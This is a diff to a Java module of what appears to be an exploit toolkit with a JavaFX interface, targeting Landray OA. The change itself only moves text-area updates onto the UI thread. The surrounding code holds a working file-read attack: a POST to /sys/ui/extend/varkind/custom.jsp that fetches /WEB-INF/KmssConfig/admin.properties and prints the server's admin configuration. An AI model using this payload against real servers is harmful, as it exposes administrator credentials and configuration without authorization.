@@ -2,6 +2,7 @@ package exp.oa.landrayoa;
 
 import core.Exploitlnterface;
 import java.util.HashMap;
+import javafx.application.Platform;
 import javafx.scene.control.TextArea;
 import utils.HttpTools;
 import utils.Response;
@@ -28,10 +29,14 @@ public class landray_sysSearchMain implements Exploitlnterface {
         String poststr = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
         Response post = HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", poststr, head, "utf-8");
         if(post.getCode() == 200 && post.getText().contains("kmss.properties")) {
-            textArea.appendText(post.getText().replace("\n","").replace("kmss.properties.encrypt.enabled = true",""));
+           Platform.runLater(()->{
+              textArea.appendText(post.getText().replace("\n","").replace("kmss.properties.encrypt.enabled = true",""));
+           });
             return true;
         }else {
-            textArea.appendText("\n landray_sysSearchMain.do-RCE-漏洞不存在 (出现误报请联系作者)");
+         Platform.runLater(()->{
+              textArea.appendText("\n landray_sysSearchMain.do-RCE-漏洞不存在 (出现误报请联系作者)");
+         });
             return false;
         }
     }
